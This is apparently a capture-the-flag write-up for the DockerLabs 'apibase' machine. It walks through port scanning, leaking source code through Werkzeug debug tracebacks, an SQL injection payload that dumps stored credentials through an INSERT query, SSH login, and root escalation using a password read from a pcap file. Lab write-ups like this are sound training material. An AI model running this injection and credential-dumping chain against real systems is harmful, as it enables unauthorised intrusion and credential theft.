# apibase

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| apibase | El Pingüino de Mario | easy/facil | dockerlabs |

**Summary:** The apibase machine revolved around a vulnerable Flask/Werkzeug REST API exposed on port 5000. Initial probing of the API's endpoints revealed that the `/add` route accepted POST parameters `username` and `password` and inserted them directly into a raw SQLite query string using Python f-string formatting, constituting a classic SQL injection vulnerability. The Werkzeug debugger was active in production, inadvertently leaking the full source code of the application through verbose 500 error responses. By crafting a stacked INSERT payload with a subquery against the `users` table, all existing credentials were exfiltrated in a single request and retrieved through the `/users` query endpoint. The dumped credentials exposed the user `pingu` with the password `pinguinasio`, which granted SSH access. Once inside, the `/home` directory contained a raw `network.pcap` file alongside the application source and the SQLite database. Printing the pcap file directly to the terminal produced readable ASCII fragments revealing an FTP session with the credentials `root:balulero`, which were then used with `su - root` to achieve a full root shell.

---

## Reconnaissance

**1. Machine Deployment**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ sudo bash auto_deploy.sh apibase.tar 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /"""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2. Port Scan**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 10:51 +0700
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u4 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:ab:09:61:00:7b:cc:18:48:8e:bf:8d:3d:e4:cd:b5 (RSA)
|   256 42:0c:71:44:7c:13:ba:8f:b7:82:35:f2:b3:f7:b9:ff (ECDSA)
|_  256 85:95:6c:96:ac:a1:f0:3e:1e:0d:c1:c8:b0:6f:bb:1d (ED25519)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.9.2)
|_http-server-header: Werkzeug/1.0.1 Python/3.9.2
|_http-title: Site doesn't have a title (application/json).
MAC Address: F6:61:6E:00:4A:CA (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.76 seconds
```

The scan revealed two open ports: SSH on 22 and a Werkzeug HTTP server running a Python application on port 5000. The `application/json` content type on the root confirmed a REST API was being served.

---

## Initial Access

### API Enumeration

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ gobuster dir -u http://$ip:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x txt,php,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
add                  (Status: 405) [Size: 178]
console              (Status: 400) [Size: 192]
```

**3. Probing the Root Endpoint**

Curling the API root returned a helpful message disclosing the two available endpoints: `/add` and `/users`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ curl -i http://$ip:5000                                  
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 97
Server: Werkzeug/1.0.1 Python/3.9.2
Date: Tue, 28 Jul 2026 04:01:54 GMT

{
  "message": "No endpoint selected. Please use /add to add a user or /users to query users."
}
```

**4. Testing /add with GET**

A GET request to `/add` confirmed it only accepted POST and OPTIONS methods.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ curl -i http://$ip:5000/add        
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, POST
Content-Length: 178
Server: Werkzeug/1.0.1 Python/3.9.2
Date: Tue, 28 Jul 2026 04:03:24 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

**5. Testing /users with No Parameters**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ curl -i http://$ip:5000/users
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 35
Server: Werkzeug/1.0.1 Python/3.9.2
Date: Tue, 28 Jul 2026 04:03:34 GMT

{
  "error": "Invalid parameter"
}
```

**6. Probing /console**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ curl -i http://$ip:5000/console
HTTP/1.0 400 BAD REQUEST
Content-Type: text/html; charset=utf-8
Content-Length: 192
Server: Werkzeug/1.0.1 Python/3.9.2
Date: Tue, 28 Jul 2026 04:03:45 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>
```

### Source Code Disclosure via Werkzeug Debugger

**7. Triggering a 500 Error on /add with No Body**

Sending a POST request to `/add` with no body triggered a 500 Internal Server Error. Because Werkzeug's interactive debugger was left enabled in production, the full traceback and surrounding source code were returned in the response, revealing the application's internals.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ curl -i http://$ip:5000/add -X POST
HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
X-XSS-Protection: 0
Connection: close
Server: Werkzeug/1.0.1 Python/3.9.2
Date: Tue, 28 Jul 2026 04:04:46 GMT
...
<li><div class="frame" id="frame-136599429122224">
  <h4>File <cite class="filename">"/home/app.py"</cite>,
      line <em class="line">20</em>,
      in <code class="function">add_user</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span>def root():</pre>
<pre class="line before"><span class="ws">    </span>return jsonify({"message": "No endpoint selected. Please use /add to add a user or /users to query users."}), 200</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span>@app.route('/add', methods=['POST'])</pre>
<pre class="line before"><span class="ws"></span>def add_user():</pre>
<pre class="line current"><span class="ws">    </span>username = request.form['username']</pre>
<pre class="line after"><span class="ws">    </span>password = request.form['password']</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>conn = sqlite3.connect('users.db')</pre>
<pre class="line after"><span class="ws">    </span>c = conn.cursor()</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>
```

The traceback disclosed the application source path (`/home/app.py`) and the structure of the `add_user` function: `username` and `password` were taken directly from the POST form and used in a raw SQLite query. The next step confirmed the SQL query construction.

**8. Sending username Only to Advance the Traceback**

Submitting only `username` caused the error to advance to the next line, which revealed the raw f-string INSERT query: `INSERT INTO users (username, password) VALUES ('{username}', '{password}')`. This was an unambiguous SQL injection point.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ curl -i -X POST http://$ip:5000/add -d "username=test"
HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
X-XSS-Protection: 0
Connection: close
Server: Werkzeug/1.0.1 Python/3.9.2
Date: Tue, 28 Jul 2026 04:17:38 GMT
...
<li><div class="frame" id="frame-136599454190560">
  <h4>File <cite class="filename">"/home/app.py"</cite>,
      line <em class="line">21</em>,
      in <code class="function">add_user</code></h4>
  <div class="source "><pre class="line before"><span class="ws">    </span>return jsonify({"message": "No endpoint selected. Please use /add to add a user or /users to query users."}), 200</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span>@app.route('/add', methods=['POST'])</pre>
<pre class="line before"><span class="ws"></span>def add_user():</pre>
<pre class="line before"><span class="ws">    </span>username = request.form['username']</pre>
<pre class="line current"><span class="ws">    </span>password = request.form['password']</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>conn = sqlite3.connect('users.db')</pre>
<pre class="line after"><span class="ws">    </span>c = conn.cursor()</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>query = f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')"</pre></div>
</div>
```

### Exploiting SQL Injection to Dump Credentials

**9. Crafting the SQLi Payload**

With the raw INSERT query structure confirmed, a stacked INSERT payload was crafted. By closing the first VALUES tuple early and injecting a subquery that performed `SELECT group_concat(username||':'||password) FROM users`, all existing user credentials were inserted into the `password` field of a new row named `pwned` in a single request.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ curl -i -X POST http://$ip:5000/add \
  --data-urlencode "username=pwned', (SELECT group_concat(username||':'||password) FROM users))-- -" \
  --data-urlencode "password=x"
HTTP/1.0 201 CREATED
Content-Type: application/json
Content-Length: 30
Server: Werkzeug/1.0.1 Python/3.9.2
Date: Tue, 28 Jul 2026 04:13:10 GMT

{
  "message": "User added"
}
```

A `201 CREATED` response confirmed the payload executed successfully.

**10. Retrieving the Dumped Credentials**

Querying the `pwned` user via the `/users` endpoint returned the exfiltrated data in the password field.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ curl -s "http://$ip:5000/users?username=pwned"
[
  [
    3, 
    "pwned", 
    "pingu:your_password,pingu:pinguinasio"
  ]
]
```

The dump revealed one real account: `pingu` with the password `pinguinasio` (alongside a placeholder `your_password` entry). SSH access was attempted with these credentials.

### SSH Access as pingu

**11. Logging in via SSH**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/apibase]
└─$ ssh pingu@$ip
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
pingu@172.17.0.2's password: 
Linux fa23bcc38755 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul 28 04:14:12 2026 from 172.17.0.1
pingu@fa23bcc38755:~$ id;whoami;hostname
uid=1000(pingu) gid=1000(pingu) groups=1000(pingu)
pingu
fa23bcc38755
```

A foothold was established as `pingu`.

---

## Privilege Escalation

### Credential Discovery via pcap Inspection

**12. Enumerating /home**

Listing `/home` revealed the application source `app.py`, the SQLite database `users.db`, and a notable `network.pcap` file.

```bash
pingu@fa23bcc38755:~$ cd /home
pingu@fa23bcc38755:/home$ ls -la
total 32
drwxr-xr-x 1 root  root  4096 Feb 27  2025 .
drwxr-xr-x 1 root  root  4096 Jul 28 04:13 ..
-rw-r--r-- 1 root  root  1631 Feb 27  2025 app.py
-rw-r--r-- 1 root  root   399 Feb 27  2025 network.pcap
drwxr-xr-x 1 pingu pingu 4096 Jul 28 04:14 pingu
-rw-r--r-- 1 root  root  8192 Feb 27  2025 users.db
```

**13. Reading the pcap for Cleartext Credentials**

Printing `network.pcap` directly to the terminal produced binary noise interspersed with readable ASCII strings. Among the output, a cleartext FTP session was visible containing an `LOGIN root` command followed by `PASS balulero`, along with an `Access Denied` response indicating the traffic captured a failed FTP authentication attempt against the root account using the password `balulero`.

```bash
pingu@fa23bcc38755:/home$ cat network.pcap 
▒▒▒▒▒▒&▒gVF((E(@"▒▒▒P .▒&▒g@G((E(@O▒▒P [▒&▒g▒G((E(@"▒▒▒P .▒&▒g3H33E3@"▒▒▒P aRLOGIN root
&▒g
   I66E6@"▒▒▒P ▒▒PASS balulero
&▒g▒I66E6@O▒▒P ▒Access Denied
```

**14. Escalating to Root via su**

The password `balulero` recovered from the pcap was tested against the root account with `su - root`.

```bash
pingu@fa23bcc38755:/home$ su - root
Password: 
root@fa23bcc38755:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
fa23bcc38755
```

Full root access was achieved.

---

## Attack Chain Summary
1. **Reconnaissance**: Nmap identified SSH on port 22 and a Werkzeug Python REST API on port 5000.
2. **Vulnerability Discovery**: Probing the `/add` endpoint with a bare POST request triggered Werkzeug's debug mode, leaking the full application source code. The code revealed that `username` and `password` were interpolated directly into a raw f-string SQL query, confirming SQL injection via the INSERT statement.
3. **Exploitation**: A stacked INSERT payload with a `group_concat` subquery was crafted to exfiltrate all rows from the `users` table into a single field. Querying the `/users` endpoint retrieved the dumped credentials: `pingu:pinguinasio`.
4. **Internal Enumeration**: SSH access as `pingu` was established. Inspection of `/home` revealed a `network.pcap` file. Printing it to the terminal exposed cleartext FTP authentication traffic containing `LOGIN root` and `PASS balulero`.
5. **Privilege Escalation**: The password `balulero` extracted from the pcap was used with `su - root`, granting a full root shell.
